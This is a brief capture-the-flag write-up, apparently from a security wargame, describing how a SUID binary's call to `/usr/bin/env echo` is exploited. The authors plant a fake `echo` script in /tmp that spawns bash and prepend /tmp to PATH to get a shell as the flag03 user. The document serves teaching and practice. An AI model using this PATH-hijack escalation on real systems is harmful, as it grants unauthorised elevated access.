- We ran `ls -l` and we saw that level03 is owned by flag03 and that it has the SUID bit (which means that it'll be ran by flag03)
- We used Ghidra to decompile ./level03 and see the code
- We saw a system call that ran the command `/usr/bin/env echo EXPLOIT ME`
- Then, we created a bash script called "echo" in tmp directory
- `chmod +x /tmp/echo`
- In echo script we called bash :
```
#!/bin/sh

bash
```
- We added /tmp to the PATH (variable env) : `PATH=/tmp:$PATH`
- Finally we executed ./level03
- WE ARE FLAG03 !!!!!!! (getflag)
